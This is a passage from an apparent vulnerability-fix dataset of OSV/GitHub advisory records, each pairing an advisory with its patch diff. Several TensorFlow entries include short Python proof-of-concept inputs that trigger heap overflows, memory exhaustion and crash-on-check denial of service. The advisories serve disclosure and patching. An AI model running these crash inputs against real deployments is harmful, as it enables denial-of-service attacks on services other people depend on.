      "chain": "{'https://github.com/jupyterhub/firstuseauthenticator/pull/38/commits/9e200d974e0cb85d828a6afedb8ab90a37878f28', 'https://github.com/jupyterhub/firstuseauthenticator/pull/38/commits/32b21898fb2b53b1a2e36270de6854ad70e9e9bf'}",
      "dataset": "osv",
      "summary": "Improper Access Control in jupyterhub-firstuseauthenticator ### Impact\n\nWhen JupyterHub is used with FirstUseAuthenticator, the vulnerability allows unauthorized access to any user's account if `create_users=True` and the username is known or guessed.\n\n### Patches\n\nUpgrade to jupyterhub-firstuseauthenticator to 1.0, or apply patch https://github.com/jupyterhub/firstuseauthenticator/pull/38.patch\n\n### Workarounds\n\nIf you cannot upgrade, there is no complete workaround, but it can be mitigated.\n\nIf you cannot upgrade yet, you can disable user creation with `c.FirstUseAuthenticator.create_users = False`, which will only allow login with fully normalized usernames for already existing users prior to jupyterhub-firstuserauthenticator 1.0. If any users have never logged in with their normalized username (i.e. lowercase), they will still be vulnerable until you can patch or upgrade.",
      "published_date": "2021-10-28",
      "chain_len": 2,
      "project": "https://github.com/jupyterhub/firstuseauthenticator",
      "commit_href": "https://github.com/jupyterhub/firstuseauthenticator/pull/38/commits/32b21898fb2b53b1a2e36270de6854ad70e9e9bf",
      "commit_sha": "32b21898fb2b53b1a2e36270de6854ad70e9e9bf",
      "patch": "MULTI",
      "chain_ord": "['32b21898fb2b53b1a2e36270de6854ad70e9e9bf', '9e200d974e0cb85d828a6afedb8ab90a37878f28']",
      "before_first_fix_commit": "{'32b21898fb2b53b1a2e36270de6854ad70e9e9bf'}",
      "last_fix_commit": "9e200d974e0cb85d828a6afedb8ab90a37878f28",
      "chain_ord_pos": 1.0,
      "commit_datetime": "09/02/2021, 20:23:22",
      "message": "lowercase username to lock password",
      "author": "George Hunt",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'firstuseauthenticator/firstuseauthenticator.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/jupyterhub/firstuseauthenticator/raw/32b21898fb2b53b1a2e36270de6854ad70e9e9bf/firstuseauthenticator%2Ffirstuseauthenticator.py', 'patch': \"@@ -138,7 +138,7 @@ def validate_username(self, name):\\n \\n     @gen.coroutine\\n     def authenticate(self, handler, data):\\n-        username = data['username']\\n+        username = data['username'].lower()\\n \\n         if not self.create_users:\\n             if not self._user_exists(username):\"}}",
      "message_norm": "lowercase username to lock password",
      "language": "en",
      "entities": "[('password', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['firstuseauthenticator/firstuseauthenticator.py'])",
      "num_files": 1.0
    },
    {
      "index": 246,
      "vuln_id": "GHSA-3ff2-r28g-w7h9",
      "cwe_id": "{'CWE-787', 'CWE-120'}",
      "score": 5.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/c79ba87153ee343401dbe9d1954d7f79e521eb14'}",
      "dataset": "osv",
      "summary": "Heap buffer overflow in `Transpose` ### Impact\nThe [shape inference function for `Transpose`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/array_ops.cc#L121-L185) is vulnerable to a heap buffer overflow:\n\n```python\nimport tensorflow as tf\n@tf.function\ndef test():\n  y = tf.raw_ops.Transpose(x=[1,2,3,4],perm=[-10])\n  return y\n\ntest()\n```\n\nThis occurs whenever `perm` contains negative elements. The shape inference function does not validate that the indices in `perm` are all valid:\n        \n```cc\nfor (int32_t i = 0; i < rank; ++i) {\n  int64_t in_idx = data[i];\n  if (in_idx >= rank) {\n    return errors::InvalidArgument(\"perm dim \", in_idx,\n                                   \" is out of range of input rank \", rank);\n  }\n  dims[i] = c->Dim(input, in_idx);\n}\n```\n\nwhere `Dim(tensor, index)` accepts either a positive index less than the rank of the tensor or the special value `-1` for unknown dimensions.\n\n### Patches\nWe have patched the issue in GitHub commit [c79ba87153ee343401dbe9d1954d7f79e521eb14](https://github.com/tensorflow/tensorflow/commit/c79ba87153ee343401dbe9d1954d7f79e521eb14).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
      "published_date": "2021-11-10",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/c79ba87153ee343401dbe9d1954d7f79e521eb14",
      "commit_sha": "c79ba87153ee343401dbe9d1954d7f79e521eb14",
      "patch": "SINGLE",
      "chain_ord": "['c79ba87153ee343401dbe9d1954d7f79e521eb14']",
      "before_first_fix_commit": "{'042dc3be4c54a51c2608ad53dabaeb34afa3e63c'}",
      "last_fix_commit": "c79ba87153ee343401dbe9d1954d7f79e521eb14",
      "chain_ord_pos": 1.0,
      "commit_datetime": "10/15/2021, 02:39:00",
      "message": "Make Transpose's shape inference function validate that negative `perm` values are within the tensor's rank.\n\nPiperOrigin-RevId: 403252853\nChange-Id: Ia6b31b45b237312668bb31c2c3b3c7bbce2d2610",
      "author": "Penporn Koanantakool",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'tensorflow/core/ops/array_ops.cc': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/c79ba87153ee343401dbe9d1954d7f79e521eb14/tensorflow%2Fcore%2Fops%2Farray_ops.cc', 'patch': '@@ -168,7 +168,7 @@ Status TransposeShapeFn(InferenceContext* c) {\\n \\n     for (int32_t i = 0; i < rank; ++i) {\\n       int64_t in_idx = data[i];\\n-      if (in_idx >= rank) {\\n+      if (in_idx >= rank || in_idx <= -rank) {\\n         return errors::InvalidArgument(\"perm dim \", in_idx,\\n                                        \" is out of range of input rank \", rank);\\n       }'}}",
      "message_norm": "make transpose's shape inference function validate that negative `perm` values are within the tensor's rank.\n\npiperorigin-revid: 403252853\nchange-id: ia6b31b45b237312668bb31c2c3b3c7bbce2d2610",
      "language": "en",
      "entities": "[('validate', 'ACTION', ''), ('403252853', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/ops/array_ops.cc'])",
      "num_files": 1.0
    },
    {
      "index": 3027,
      "vuln_id": "GHSA-rxch-gp62-574w",
      "cwe_id": "{'CWE-79'}",
      "score": 6.4,
      "chain": "{'https://github.com/snipe/snipe-it/commit/9d5d1a9f9aae2c8baee48551185da5de0cdb62c2'}",
      "dataset": "osv",
      "summary": "snipe-it is vulnerable to Cross-site Scripting snipe-it is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting').",
      "published_date": "2021-12-16",
      "chain_len": 1,
      "project": "https://github.com/snipe/snipe-it",
      "commit_href": "https://github.com/snipe/snipe-it/commit/9d5d1a9f9aae2c8baee48551185da5de0cdb62c2",
      "commit_sha": "9d5d1a9f9aae2c8baee48551185da5de0cdb62c2",
      "patch": "SINGLE",
      "chain_ord": "['9d5d1a9f9aae2c8baee48551185da5de0cdb62c2']",
      "before_first_fix_commit": "{'3a7cef15bd7578f93104011137222512d4c95f4e'}",
      "last_fix_commit": "9d5d1a9f9aae2c8baee48551185da5de0cdb62c2",
      "chain_ord_pos": 1.0,
      "commit_datetime": "12/13/2021, 20:03:03",
      "message": "Added escape to assigned_to API response\n\nSigned-off-by: snipe <snipe@snipe.net>",
      "author": "snipe",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 1, 'total': 2}",
      "files": "{'app/Http/Transformers/AssetsTransformer.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/snipe/snipe-it/raw/9d5d1a9f9aae2c8baee48551185da5de0cdb62c2/app%2FHttp%2FTransformers%2FAssetsTransformer.php', 'patch': \"@@ -170,7 +170,7 @@ public function transformAssignedTo($asset)\\n         }\\n         return $asset->assigned ? [\\n             'id' => $asset->assigned->id,\\n-            'name' => $asset->assigned->display_name,\\n+            'name' => e($asset->assigned->display_name),\\n             'type' => $asset->assignedType()\\n         ] : null;\\n     }\"}}",
      "message_norm": "added escape to assigned_to api response\n\nsigned-off-by: snipe <snipe@snipe.net>",
      "language": "en",
      "entities": "[('added', 'ACTION', ''), ('escape', 'SECWORD', ''), ('snipe@snipe.net', 'EMAIL', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['app/Http/Transformers/AssetsTransformer.php'])",
      "num_files": 1.0
    },
    {
      "index": 1628,
      "vuln_id": "GHSA-cwpm-f78v-7m5c",
      "cwe_id": "{'CWE-400', 'CWE-20'}",
      "score": 5.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/bd4d5583ff9c8df26d47a23e508208844297310e'}",
      "dataset": "osv",
      "summary": "Denial of service in `tf.ragged.constant` due to lack of validation ### Impact\nThe implementation of [`tf.ragged.constant`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/ops/ragged/ragged_factory_ops.py#L146-L239) does not fully validate the input arguments. This results in a denial of service by consuming all available memory:\n\n```python\nimport tensorflow as tf\ntf.ragged.constant(pylist=[],ragged_rank=8968073515812833920)\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [bd4d5583ff9c8df26d47a23e508208844297310e](https://github.com/tensorflow/tensorflow/commit/bd4d5583ff9c8df26d47a23e508208844297310e).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/55199).",
      "published_date": "2022-05-24",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/bd4d5583ff9c8df26d47a23e508208844297310e",
      "commit_sha": "bd4d5583ff9c8df26d47a23e508208844297310e",
      "patch": "SINGLE",
      "chain_ord": "['bd4d5583ff9c8df26d47a23e508208844297310e']",
      "before_first_fix_commit": "{'e74ef072ecd54ca54f3940ce9b98af796ded2a1a'}",
      "last_fix_commit": "bd4d5583ff9c8df26d47a23e508208844297310e",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/15/2022, 16:11:43",
      "message": "Prevent denial of service in `tf.ragged.constant`\n\nFixes #55199\n\nPiperOrigin-RevId: 442029525",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 3, 'deletions': 0, 'total': 3}",
      "files": "{'tensorflow/python/ops/ragged/ragged_factory_ops.py': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/bd4d5583ff9c8df26d47a23e508208844297310e/tensorflow%2Fpython%2Fops%2Fragged%2Fragged_factory_ops.py', 'patch': '@@ -188,6 +188,9 @@ def _constant_value(ragged_factory, inner_factory, pylist, dtype, ragged_rank,\\n     if max_depth > scalar_depth:\\n       raise ValueError(\"Invalid pylist=%r: empty list nesting is greater \"\\n                        \"than scalar value nesting\" % pylist)\\n+    if ragged_rank is not None and max_depth < ragged_rank:\\n+      raise ValueError(f\"Invalid pylist={pylist}, max depth smaller than \"\\n+                       f\"ragged_rank={ragged_rank}\")\\n \\n   # If both inner_shape and ragged_rank were specified, then check that\\n   # they are compatible with pylist.'}}",
      "message_norm": "prevent denial of service in `tf.ragged.constant`\n\nfixes #55199\n\npiperorigin-revid: 442029525",
      "language": "en",
      "entities": "[('prevent', 'ACTION', ''), ('denial of service', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('#55199', 'ISSUE', ''), ('442029525', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/python/ops/ragged/ragged_factory_ops.py'])",
      "num_files": 1.0
    },
    {
      "index": 983,
      "vuln_id": "GHSA-772j-h9xw-ffp5",
      "cwe_id": "{'CWE-843'}",
      "score": 2.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025'}",
      "dataset": "osv",
      "summary": "CHECK-fail in SparseCross due to type confusion ### Impact\nThe API of `tf.raw_ops.SparseCross` allows combinations which would result in a `CHECK`-failure and denial of service:\n\n```python\nimport tensorflow as tf\n\nhashed_output = False\nnum_buckets = 1949315406\nhash_key = 1869835877\nout_type = tf.string \ninternal_type = tf.string\n\nindices_1 = tf.constant([0, 6], shape=[1, 2], dtype=tf.int64)\nindices_2 = tf.constant([0, 0], shape=[1, 2], dtype=tf.int64)\nindices = [indices_1, indices_2]\n\nvalues_1 = tf.constant([0], dtype=tf.int64)\nvalues_2 = tf.constant([72], dtype=tf.int64)\nvalues = [values_1, values_2]\n\nbatch_size = 4\nshape_1 = tf.constant([4, 122], dtype=tf.int64)\nshape_2 = tf.constant([4, 188], dtype=tf.int64)\nshapes = [shape_1, shape_2]\n\ndense_1 = tf.constant([188, 127, 336, 0], shape=[4, 1], dtype=tf.int64)\ndense_2 = tf.constant([341, 470, 470, 470], shape=[4, 1], dtype=tf.int64)\ndense_3 = tf.constant([188, 188, 341, 922], shape=[4, 1], dtype=tf.int64)\ndenses = [dense_1, dense_2, dense_3]\n\ntf.raw_ops.SparseCross(indices=indices, values=values, shapes=shapes, dense_inputs=denses, hashed_output=hashed_output,\n                       num_buckets=num_buckets, hash_key=hash_key, out_type=out_type, internal_type=internal_type)\n```\n\nThe above code will result in a `CHECK` fail in [`tensor.cc`](https://github.com/tensorflow/tensorflow/blob/3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d/tensorflow/core/framework/tensor.cc#L670-L675):\n\n```cc\nvoid Tensor::CheckTypeAndIsAligned(DataType expected_dtype) const {\n  CHECK_EQ(dtype(), expected_dtype)\n      << \" \" << DataTypeString(expected_dtype) << \" expected, got \"\n      << DataTypeString(dtype());\n  ...\n}\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d/tensorflow/core/kernels/sparse_cross_op.cc#L114-L116) is tricked to consider a tensor of type `tstring` which in fact contains integral elements:\n\n```cc\n  if (DT_STRING == values_.dtype())\n      return Fingerprint64(values_.vec<tstring>().data()[start + n]);\n  return values_.vec<int64>().data()[start + n];\n```\n\nFixing the type confusion by preventing mixing `DT_STRING` and `DT_INT64` types solves this issue.\n\n### Patches\nWe have patched the issue in GitHub commit [b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025](https://github.com/tensorflow/tensorflow/commit/b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
      "published_date": "2021-05-21",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025",
      "commit_sha": "b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025",
      "patch": "SINGLE",
      "chain_ord": "['b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025']",
      "before_first_fix_commit": "{'3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d'}",
      "last_fix_commit": "b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/15/2021, 20:03:19",
      "message": "Fix `tf.raw_ops.SparseCross` failing CHECK.\n\nPiperOrigin-RevId: 368701671\nChange-Id: Id805729dd9ba0bda36e4bb309408129b55fb649d",
      "author": "Amit Patankar",
      "comments": null,
      "stats": "{'additions': 48, 'deletions': 7, 'total': 55}",
      "files": "{'tensorflow/core/kernels/sparse_cross_op.cc': {'additions': 48, 'deletions': 7, 'changes': 55, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025/tensorflow%2Fcore%2Fkernels%2Fsparse_cross_op.cc', 'patch': '@@ -27,6 +27,7 @@ limitations under the License.\\n #include \"tensorflow/core/framework/tensor.h\"\\n #include \"tensorflow/core/framework/tensor_shape.h\"\\n #include \"tensorflow/core/framework/types.h\"\\n+#include \"tensorflow/core/framework/types.pb.h\"\\n #include \"tensorflow/core/lib/core/stringpiece.h\"\\n #include \"tensorflow/core/lib/strings/str_util.h\"\\n #include \"tensorflow/core/platform/fingerprint.h\"\\n@@ -460,10 +461,19 @@ int64 CalculateBatchSize(const OpInputList& shapes_list_in,\\n Status ValidateInput(const OpInputList& indices_list_in,\\n                      const OpInputList& values_list_in,\\n                      const OpInputList& shapes_list_in,\\n-                     const OpInputList& dense_list_in) {\\n+                     const OpInputList& dense_list_in,\\n+                     const DataType& internal_type) {\\n   const auto size = indices_list_in.size();\\n+  // Only perform internal_type check for SparseCrossOp.\\n+  // Check if the internal_type is not invalid before doing so.\\n+  bool check_type = internal_type != DT_INVALID;\\n   // Validates indices_list_in OpInputList.\\n   for (int i = 0; i < size; i++) {\\n+    if (check_type && indices_list_in[i].dtype() != DT_INT64) {\\n+      return errors::InvalidArgument(\"Input indices should be of type \",\\n+                                     DT_INT64, \" but received \",\\n+                                     indices_list_in[i].dtype());\\n+    }\\n     if (!TensorShapeUtils::IsMatrix(indices_list_in[i].shape())) {\\n       return errors::InvalidArgument(\\n           \"Input indices should be a matrix but received shape \",\\n@@ -482,6 +492,14 @@ Status ValidateInput(const OpInputList& indices_list_in,\\n                                    values_list_in.size());\\n   }\\n   for (int i = 0; i < size; i++) {\\n+    // Make sure to avoid the expected type to be string, but input values to be\\n+    // int64.\\n+    if (check_type && internal_type == DT_STRING &&\\n+        values_list_in[i].dtype() == DT_INT64) {\\n+      return errors::InvalidArgument(\"Input values should be of internal type \",\\n+                                     internal_type, \" but received \",\\n+                                     values_list_in[i].dtype());\\n+    }\\n     if (!TensorShapeUtils::IsVector(values_list_in[i].shape())) {\\n       return errors::InvalidArgument(\\n           \"Input values should be a vector but received shape \",\\n@@ -502,6 +520,11 @@ Status ValidateInput(const OpInputList& indices_list_in,\\n                                    shapes_list_in.size());\\n   }\\n   for (int i = 0; i < size; i++) {\\n+    if (check_type && shapes_list_in[i].dtype() != DT_INT64) {\\n+      return errors::InvalidArgument(\"Input shape should be of type \", DT_INT64,\\n+                                     \" but received \",\\n+                                     shapes_list_in[i].dtype());\\n+    }\\n     if (!TensorShapeUtils::IsVector(shapes_list_in[i].shape())) {\\n       return errors::InvalidArgument(\\n           \"Input shapes should be a vector but received shape \",\\n@@ -517,6 +540,14 @@ Status ValidateInput(const OpInputList& indices_list_in,\\n \\n   // Validates dense_list_in OpInputList\\n   for (int i = 0; i < dense_list_in.size(); ++i) {\\n+    // Make sure to avoid the expected type to be string, but input values to be\\n+    // int64.\\n+    if (check_type && internal_type == DT_STRING &&\\n+        dense_list_in[i].dtype() == DT_INT64) {\\n+      return errors::InvalidArgument(\"Dense inputs should be of internal type \",\\n+                                     internal_type, \" but received \",\\n+                                     dense_list_in[i].dtype());\\n+    }\\n     if (!TensorShapeUtils::IsMatrix(dense_list_in[i].shape())) {\\n       return errors::InvalidArgument(\\n           \"Dense inputs should be a matrix but received shape \",\\n@@ -698,6 +729,7 @@ class SparseCrossOp : public OpKernel {\\n     int64 signed_hash_key_;\\n     OP_REQUIRES_OK(context, context->GetAttr(\"hash_key\", &signed_hash_key_));\\n     hash_key_ = static_cast<uint64>(signed_hash_key_);\\n+    OP_REQUIRES_OK(context, context->GetAttr(\"internal_type\", &internal_type_));\\n   }\\n \\n   void Compute(OpKernelContext* context) override {\\n@@ -711,8 +743,10 @@ class SparseCrossOp : public OpKernel {\\n     OP_REQUIRES_OK(context,\\n                    context->input_list(\"dense_inputs\", &dense_list_in));\\n \\n-    OP_REQUIRES_OK(context, ValidateInput(indices_list_in, values_list_in,\\n-                                          shapes_list_in, dense_list_in));\\n+    DataType internal_type = internal_type_;\\n+    OP_REQUIRES_OK(\\n+        context, ValidateInput(indices_list_in, values_list_in, shapes_list_in,\\n+                               dense_list_in, internal_type));\\n \\n     std::vector<std::unique_ptr<ColumnInterface<InternalType>>> columns =\\n         GenerateColumnsFromInput<InternalType>(indices_list_in, values_list_in,\\n@@ -756,6 +790,7 @@ class SparseCrossOp : public OpKernel {\\n  private:\\n   int64 num_buckets_;\\n   uint64 hash_key_;\\n+  DataType internal_type_;\\n };\\n \\n class SparseCrossV2Op : public OpKernel {\\n@@ -773,8 +808,11 @@ class SparseCrossV2Op : public OpKernel {\\n     OP_REQUIRES_OK(context,\\n                    context->input_list(\"dense_inputs\", &dense_list_in));\\n \\n-    OP_REQUIRES_OK(context, ValidateInput(indices_list_in, values_list_in,\\n-                                          shapes_list_in, dense_list_in));\\n+    // Set internal_type to invalid_type so that the check will be ignored.\\n+    DataType internal_type = DT_INVALID;\\n+    OP_REQUIRES_OK(\\n+        context, ValidateInput(indices_list_in, values_list_in, shapes_list_in,\\n+                               dense_list_in, internal_type));\\n \\n     const Tensor* sep_t;\\n     OP_REQUIRES_OK(context, context->input(\"sep\", &sep_t));\\n@@ -832,8 +870,11 @@ class SparseCrossHashedOp : public OpKernel {\\n     OP_REQUIRES_OK(context,\\n                    context->input_list(\"dense_inputs\", &dense_list_in));\\n \\n-    OP_REQUIRES_OK(context, ValidateInput(indices_list_in, values_list_in,\\n-                                          shapes_list_in, dense_list_in));\\n+    // Set internal_type to invalid_type so that the check will be ignored.\\n+    DataType internal_type = DT_INVALID;\\n+    OP_REQUIRES_OK(\\n+        context, ValidateInput(indices_list_in, values_list_in, shapes_list_in,\\n+                               dense_list_in, internal_type));\\n \\n     const Tensor* num_buckets_t;\\n     OP_REQUIRES_OK(context, context->input(\"num_buckets\", &num_buckets_t));'}}",
      "message_norm": "fix `tf.raw_ops.sparsecross` failing check.\n\npiperorigin-revid: 368701671\nchange-id: id805729dd9ba0bda36e4bb309408129b55fb649d",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('368701671', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/sparse_cross_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 1941,
      "vuln_id": "GHSA-gvm4-h8j3-rjrq",
      "cwe_id": "{'CWE-617'}",
      "score": 2.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/77dd114513d7796e1e2b8aece214a380af26fbf4'}",
      "dataset": "osv",
      "summary": "CHECK-fail in `LoadAndRemapMatrix` ### Impact\nAn attacker can cause a denial of service by exploiting a `CHECK`-failure coming from `tf.raw_ops.LoadAndRemapMatrix`:\n    \n```python\nimport tensorflow as tf\n\nckpt_path = tf.constant([], shape=[0], dtype=tf.string)\nold_tensor_name = tf.constant(\"\")\nrow_remapping = tf.constant([], shape=[0], dtype=tf.int64)\ncol_remapping = tf.constant([1], shape=[1], dtype=tf.int64)\ninitializing_values = tf.constant(1.0)\n\ntf.raw_ops.LoadAndRemapMatrix(\n    ckpt_path=ckpt_path, old_tensor_name=old_tensor_name,\n    row_remapping=row_remapping, col_remapping=col_remapping,\n    initializing_values=initializing_values, num_rows=0, num_cols=1)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/d94227d43aa125ad8b54115c03cece54f6a1977b/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L219-L222) assumes that the `ckpt_path` is always a valid scalar.\n  \n```cc\nconst string& ckpt_path = ckpt_path_t->scalar<tstring>()();\n```\n\nHowever, an attacker can send any other tensor as the first argument of `LoadAndRemapMatrix`. This would cause the rank `CHECK` in `scalar<T>()()` to trigger and terminate the process.\n\n### Patches\nWe have patched the issue in GitHub commit [77dd114513d7796e1e2b8aece214a380af26fbf4](https://github.com/tensorflow/tensorflow/commit/77dd114513d7796e1e2b8aece214a380af26fbf4).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
      "published_date": "2021-05-21",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/77dd114513d7796e1e2b8aece214a380af26fbf4",
      "commit_sha": "77dd114513d7796e1e2b8aece214a380af26fbf4",
      "patch": "SINGLE",
      "chain_ord": "['77dd114513d7796e1e2b8aece214a380af26fbf4']",
      "before_first_fix_commit": "{'faa76f39014ed3b5e2c158593b1335522e573c7f'}",
      "last_fix_commit": "77dd114513d7796e1e2b8aece214a380af26fbf4",
      "chain_ord_pos": 1.0,
      "commit_datetime": "05/04/2021, 22:46:30",
      "message": "Fix a check fail\n\nPiperOrigin-RevId: 372011072\nChange-Id: I1062cfaed0aa16884e9a16312483794d188db76f",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 5, 'deletions': 0, 'total': 5}",
      "files": "{'tensorflow/core/kernels/load_and_remap_matrix_op.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/77dd114513d7796e1e2b8aece214a380af26fbf4/tensorflow%2Fcore%2Fkernels%2Fload_and_remap_matrix_op.cc', 'patch': '@@ -123,6 +123,11 @@ class LoadAndRemapMatrixOp : public OpKernel {\\n     // Processes the checkpoint source and the provided Tensor name.\\n     const Tensor* ckpt_path_t;\\n     OP_REQUIRES_OK(context, context->input(\"ckpt_path\", &ckpt_path_t));\\n+    OP_REQUIRES(\\n+        context, ckpt_path_t->NumElements() == 1,\\n+        errors::InvalidArgument(\"The `ckpt_path` tensor must have exactly one \"\\n+                                \"element, got tensor of shape \",\\n+                                ckpt_path_t->shape().DebugString()));\\n     const string& ckpt_path = ckpt_path_t->scalar<tstring>()();\\n     const Tensor* old_tensor_name_t;\\n     OP_REQUIRES_OK(context,'}}",
      "message_norm": "fix a check fail\n\npiperorigin-revid: 372011072\nchange-id: i1062cfaed0aa16884e9a16312483794d188db76f",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('372011072', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/load_and_remap_matrix_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 2463,
      "vuln_id": "GHSA-mrvj-7q4f-5p42",
      "cwe_id": "{'CWE-79'}",
      "score": 0.0,
      "chain": "{'https://github.com/ezsystems/ezpublish-kernel/commit/29fecd2afe86f763510f10c02f14962d028f311b'}",
      "dataset": "osv",
      "summary": "Cross-site scripting in eZ Platform Kernel ### Impact\nIn file upload it is possible by certain means to upload files like .html and .js. These may contain XSS exploits which will be run when links to them are accessed by victims.\n\n### Patches\nThe fix consists simply of adding common types of scriptable file types to the configuration of the already existing filetype blacklist feature. See \"Patched versions\". As such, this can also be done manually, without installing the patched versions. This may be relevant if you are currently running a considerably older version of the kernel package and don't want to upgrade it at this time. Please see the settting \"ezsettings.default.io.file_storage.file_type_blacklist\" at:\nhttps://github.com/ezsystems/ezplatform-kernel/blob/master/eZ/Bundle/EzPublishCoreBundle/Resources/config/default_settings.yml#L109\n\n### Important note\nYou should adapt this setting to your needs. Do not add file types to the blacklist that you actually need to be able to upload. For instance, if you need your editors to be able to upload SVG files, then don't blacklist that. Instead, you could e.g. use an approval workflow for such content.",
      "published_date": "2021-03-19",
      "chain_len": 1,
      "project": "https://github.com/ezsystems/ezpublish-kernel",
      "commit_href": "https://github.com/ezsystems/ezpublish-kernel/commit/29fecd2afe86f763510f10c02f14962d028f311b",
      "commit_sha": "29fecd2afe86f763510f10c02f14962d028f311b",
      "patch": "SINGLE",
      "chain_ord": "['29fecd2afe86f763510f10c02f14962d028f311b']",
      "before_first_fix_commit": "{'4a538dbfd28fecd404f11fa0816b69a5a9e93a16'}",
      "last_fix_commit": "29fecd2afe86f763510f10c02f14962d028f311b",
      "chain_ord_pos": 1.0,
      "commit_datetime": "03/17/2021, 15:03:30",
      "message": "Merge pull request from GHSA-mrvj-7q4f-5p42\n\nCo-authored-by: Gunnstein Lye <gunnstein.lye@ibexa.co>",
      "author": "Gunnstein Lye",
      "comments": null,
      "stats": "{'additions': 10, 'deletions': 0, 'total': 10}",
